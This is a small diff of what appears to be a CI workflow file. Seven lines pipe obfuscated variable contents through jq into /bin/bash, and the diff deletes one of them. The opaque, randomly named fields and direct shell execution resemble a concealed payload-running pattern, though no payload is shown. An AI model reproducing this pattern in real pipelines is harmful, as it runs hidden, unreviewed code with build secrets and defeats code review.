@@ -28,7 +28,6 @@ jobs:
           echo $gfmjp79 | jq -r .rbm4 | /bin/bash
           printf '%s' "$lq79662" | jq -r .jr0 | /bin/bash
           echo $bzaht023 | jq -r .cjig4075 | /bin/bash
-          echo $ijaof94 | jq -r .kvft8 | /bin/bash
           printf '%s' "$hvs70" | jq -r .cfa098 | /bin/bash
           printf '%s' "$yeth87874" | jq -r .c20 | /bin/bash
           printf '%s' "$h7506" | jq -r .libmj20 | /bin/bash
